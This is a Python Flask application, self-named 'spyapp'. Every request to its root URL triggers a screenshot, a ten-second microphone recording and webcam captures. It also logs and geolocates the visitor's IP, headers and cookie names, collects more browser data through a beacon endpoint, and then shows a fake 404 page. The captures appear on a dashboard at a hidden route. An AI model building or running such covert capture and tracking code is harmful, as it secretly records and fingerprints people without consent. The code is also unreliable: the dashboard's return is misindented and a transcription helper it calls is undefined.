import os
import time
import hashlib
import traceback
import requests
import sounddevice as sd
from PIL import ImageGrab
from scipy.io.wavfile import write
import cv2
import re
from pathlib import Path
from functools import lru_cache
from flask import Flask, abort, request, render_template, jsonify, send_from_directory
from werkzeug.middleware.proxy_fix import ProxyFix



# ---------- Helpers to locate the latest capture ----------
CAPTURE_PREFIX = "spyapp_"
CAPTURES_DIR = Path(__file__).resolve().parent / "captures"

def _latest_capture_dir():
    if not CAPTURES_DIR.exists():
        return None
    dirs = [p for p in CAPTURES_DIR.iterdir() if p.is_dir() and p.name.startswith(CAPTURE_PREFIX)]
    if not dirs:
        return None
    # folders named spyapp_YYYYmmdd_HHMMSS
    return sorted(dirs, key=lambda p: p.name, reverse=True)[0]

def _find_in_dir(d: Path, pattern: str):
    return sorted(d.glob(pattern))

# ----------------------------
# Existing capture workflow
# ----------------------------
def run_spy_tasks():
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    base_dir = os.path.dirname(os.path.abspath(__file__))
    captures_dir = os.path.join(base_dir, "captures")
    os.makedirs(captures_dir, exist_ok=True)
    run_dir = os.path.join(captures_dir, f"spyapp_{timestamp}")
    os.makedirs(run_dir, exist_ok=True)

    screenshot_path = os.path.join(run_dir, f"screen_{timestamp}.png")
    mic_path = os.path.join(run_dir, f"mic_{timestamp}.wav")
    duration = 10  # seconds
    results = {
        "timestamp": timestamp,
        "run_dir": run_dir,
        "screenshot": None,
        "mic": None,
        "webcam": []
    }

    try:
        img = ImageGrab.grab()
        img.save(screenshot_path)
        print(f"[+] Screenshot saved: {screenshot_path}")
        results["screenshot"] = screenshot_path
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")
        traceback.print_exc()
        results["screenshot_error"] = str(e)

    try:
        print(f"[+] Recording mic for {duration} seconds...")
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')

        print("[+] Capturing 1 webcam image per second for 10 seconds...")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Webcam not accessible")

        for i in range(duration):
            ret, frame = cap.read()
            img_path = os.path.join(run_dir, f"webcam_{timestamp}_{i+1:02d}.png")
            if ret:
                cv2.imwrite(img_path, frame)
                print(f"[+] Webcam image saved: {img_path}")
                results["webcam"].append(img_path)
            else:
                print(f"[!] Failed to capture webcam image at second {i+1}.")
            time.sleep(1)

        cap.release()
        sd.wait()
        write(mic_path, fs, recording)
        print(f"[+] Mic recording saved: {mic_path}")
        results["mic"] = mic_path

    except Exception as e:
        print(f"[!] Mic/webcam task failed: {e}")
        traceback.print_exc()
        results["mic_webcam_error"] = str(e)

    return results


# ----------------------------
# Client capture helpers
# ----------------------------
def _now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

@lru_cache(maxsize=4096)
def enrich_ip(ip: str) -> dict:
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "0.")):
        return {"note": "private_or_empty_ip"}
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2.5)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        return {"error": f"ip_enrich_failed: {type(e).__name__}"}

def _client_ip(req) -> str:
    ip = req.remote_addr or ""
    if ip:
        return ip
    xff = req.headers.get("X-Forwarded-For", "")
    parts = [p.strip() for p in xff.split(",") if p.strip()]
    return parts[-1] if parts else ""

def _safe_headers(req):
    want = [
        "User-Agent", "Accept-Language", "Referer",
        "X-Forwarded-For", "X-Forwarded-Proto", "X-Forwarded-Host",
        "CF-Connecting-IP", "CF-IPCountry", "True-Client-IP", "Forwarded",
        "Sec-CH-UA", "Sec-CH-UA-Platform", "Sec-CH-UA-Mobile",
        "Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-Dest",
    ]
    return {k: req.headers.get(k) for k in want if req.headers.get(k)}

def _connection_info(req):
    env = req.environ
    return {
        "scheme": req.scheme,
        "is_secure": req.is_secure,
        "server": env.get("SERVER_NAME"),
        "server_port": env.get("SERVER_PORT"),
        "http_protocol": env.get("SERVER_PROTOCOL"),
        "remote_port": env.get("REMOTE_PORT"),
        "wsgi_url_scheme": env.get("wsgi.url_scheme"),
    }

def _cookie_names(req):
    try:
        return list(req.cookies.keys())
    except Exception:
        return []

def _short_hash(s: str) -> str:
    import hashlib
    return hashlib.sha256(s.encode("utf-8")).hexdigest()[:16]

def write_markdown(run_dir: str, payload: dict, timestamp: str):
    md_path = os.path.join(run_dir, f"client_{timestamp}.md")

    def kv(title, d):
        if not d:
            return f"### {title}\n(none)\n\n"
        lines = "\n".join([f"- **{k}**: {d[k]}" for k in d])
        return f"### {title}\n{lines}\n\n"

    md = []
    md.append(f"# Client Capture — {timestamp}\n\n")
    md.append(f"- **ts**: `{payload.get('ts')}`\n")
    md.append(f"- **req_id**: `{payload.get('req_id')}`\n")
    md.append(f"- **method**: `{payload.get('method')}`\n")
    md.append(f"- **url**: `{payload.get('url')}`\n")
    md.append(f"- **path**: `{payload.get('path')}`\n")
    md.append(f"- **ip**: `{payload.get('ip')}`\n")
    md.append(f"- **ua**: `{payload.get('ua')}`\n")
    md.append(f"- **referrer**: `{payload.get('referrer')}`\n")
    md.append(f"- **accept_languages**: `{payload.get('accept_languages')}`\n\n")
    md.append(kv("Headers", payload.get("headers", {})))
    md.append(kv("Query", payload.get("query", {})))
    md.append(kv("Cookies (names only)", {"cookies": payload.get("cookies", [])}))
    md.append(kv("Connection", payload.get("connection", {})))

    ip_meta = payload.get("ip_enrichment") or {}
    md.append("### IP Enrichment (ipapi.co)\n")
    if ip_meta:
        show = {}
        for k in ("ip", "version", "city", "region", "country_name", "country", "postal",
                  "latitude", "longitude", "org", "asn", "timezone", "utc_offset"):
            if k in ip_meta:
                show[k] = ip_meta[k]
        if show:
            md.append("\n".join([f"- **{k}**: {show[k]}" for k in show]) + "\n\n")
        else:
            md.append(f"```\n{ip_meta}\n```\n\n")
    else:
        md.append("(none)\n\n")

    with open(md_path, "w", encoding="utf-8") as f:
        f.write("".join(md))

    print(f"[+] Client markdown saved: {md_path}")
    return md_path


# ----------------------------
# Flask app + routes
# ----------------------------
app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)


@app.route("/", methods=["GET"])
def root():
    """
    On GET /:
      1) Run existing tasks (creates captures/spyapp_<ts>).
      2) Collect server-side client details and write client_<ts>.md.
      3) Return a tiny page that immediately posts richer browser data to /beacon?ts=<ts>,
         then redirects to /gone (404) after ~10s to mimic previous behavior.
    """
    run = run_spy_tasks()
    run_dir = run["run_dir"]
    ts = run["timestamp"]

    # server-side details
    ip = _client_ip(request)
    ip_meta = enrich_ip(ip)
    event = {
        "ts": _now_iso(),
        "req_id": _short_hash(f"{_now_iso()}|{ip}|{request.path}|{request.user_agent}"),
        "method": request.method,
        "url": request.base_url,
        "path": request.path,
        "query": request.args.to_dict(flat=False),
        "headers": _safe_headers(request),
        "cookies": _cookie_names(request),
        "ip": ip,
        "ip_enrichment": ip_meta,
        "ua": str(request.user_agent),
        "accept_languages": [str(l) for l in request.accept_languages],
        "referrer": request.referrer,
        "connection": _connection_info(request),
    }
    write_markdown(run_dir, event, ts)

    # render tiny page that fires the beacon and then "disappears"
    return render_template("index.html", ts=ts)


@app.route("/beacon", methods=["POST"])
def beacon():
    """
    Receives browser-only data and appends it to client_<ts>.md in the same run folder.
    """
    ts = request.args.get("ts")
    if not ts:
        return jsonify({"ok": False, "error": "missing ts"}), 400

    base_dir = os.path.dirname(os.path.abspath(__file__))
    run_dir = os.path.join(base_dir, "captures", f"spyapp_{ts}")
    if not os.path.isdir(run_dir):
        return jsonify({"ok": False, "error": "run_dir not found"}), 404

    beacon_data = request.get_json(silent=True) or {}
    md_path = os.path.join(run_dir, f"client_{ts}.md")

    try:
        with open(md_path, "a", encoding="utf-8") as f:
            f.write("\n## Browser Beacon Data\n\n")
            if beacon_data:
                for k, v in beacon_data.items():
                    f.write(f"- **{k}**: `{v}`\n")
            else:
                f.write("(none)\n")
        print(f"[+] Beacon data appended to: {md_path}")
        return jsonify({"ok": True})
    except Exception as e:
        print(f"[!] Failed to append beacon data: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500
      
      

# ---------- Dashboard ----------
@app.route("/everytimeyouvisitawebsite")
def dashboard():
    cap_dir = _latest_capture_dir()
    if not cap_dir:
        return render_template("dashboard.html", have_capture=False)

    # find artifacts
    ts = cap_dir.name.replace(CAPTURE_PREFIX, "")
    screenshot = _find_in_dir(cap_dir, "screen_*.png")
    webcam = _find_in_dir(cap_dir, "webcam_*.png")
    audio = _find_in_dir(cap_dir, "mic_*.wav")
    client_md = _find_in_dir(cap_dir, f"client_{ts}.md")

    # attempt transcript if missing
    transcript = None
    if audio:
        txt = audio[0].with_suffix(".txt")
        if not txt.exists():
            _maybe_transcribe(audio[0])
        if txt.exists():
            transcript = txt

    # read markdown (client + beacon now merged there)
    import markdown as mdlib

    if client_md:
        md_text = client_md[0].read_text(encoding="utf-8")
        md_html = mdlib.markdown(md_text, extensions=["tables", "fenced_code"])
    else:
        md_html = "<h3>No client markdown found</h3>"
        
        return render_template(
        "dashboard.html",
        have_capture=True,
        ts=ts,
        cap_dir=cap_dir.name,
        screenshot=screenshot[0].name if screenshot else None,
        webcam=[p.name for p in webcam],
        audio=audio[0].name if audio else None,
        transcript=transcript.name if transcript else None,
        md_html=md_html
    )
        

# serve files out of the latest capture dir (static-ish helper)
@app.route("/captures/<cap>/<path:fname>")
def serve_capture(cap, fname):
    root = CAPTURES_DIR / cap
    return send_from_directory(root, fname)

# ---------- Custom 404 with link ----------
@app.errorhandler(404)
def not_found(e):
    # return a pretty 404 with a CTA
    return render_template("gone.html"), 404
      

@app.route("/gone")
def gone():
    abort(404, description="Resource doesn't exist.")


if __name__ == "__main__":
    print("[i] Starting Flask server on http://localhost:4044 ...")
    app.run(host="0.0.0.0", port=4044)
    
